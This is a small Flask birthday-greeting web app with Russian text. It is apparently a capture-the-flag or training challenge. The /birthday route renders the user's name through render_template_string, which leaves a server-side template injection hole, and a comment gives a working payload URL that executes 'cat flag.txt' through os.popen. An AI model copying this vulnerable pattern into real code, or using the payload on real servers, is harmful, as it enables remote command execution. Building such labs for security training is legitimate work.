from flask import Flask, request, render_template_string, url_for
import random
app = Flask(__name__)

# Список поздравлений
greetings = [
    "Желаем счастья, здоровья и много радостных моментов!",
    "Пусть каждый день приносит новые удивительные впечатления!",
    "Желаем великолепного настроения, удачи и исполнения желаний!",
    "Пусть этот год будет лучше предыдущего, полон успехов и достижений!",
    "Желаем тебе ярких событий, интересных хобби и верных друзей рядом!"
]
#http://localhost:5000/ssti?input=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen(%27cat+flag.txt%27).read()+%7D%7D
@app.route('/')
def home():
    return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Поздравление с Днем Рождения!</title>
            <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='style.css') }}">
        </head>
        <body>
            <h1>Поздравление с Днем Рождения!</h1>
            <p>Введите ваше имя и получите поздравление:</p>
            <form action="/birthday" method="GET">
                <input name="name" type="text" placeholder="Ваше имя" />
                <input type="submit" value="Получить поздравление" />
            </form>
        </body>
        </html>
    ''')

@app.route('/birthday')
def birthday():
    name = request.args.get('name', 'Друг')
    greeting = random.choice(greetings)  # Выбираем случайное поздравление
    message = f'Дорогой(ая) {name}, {greeting}'  # Формируем сообщение с поздравлением
    return render_template_string(f'<h2>{message}</h2><a href="/">Назад</a>')




if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)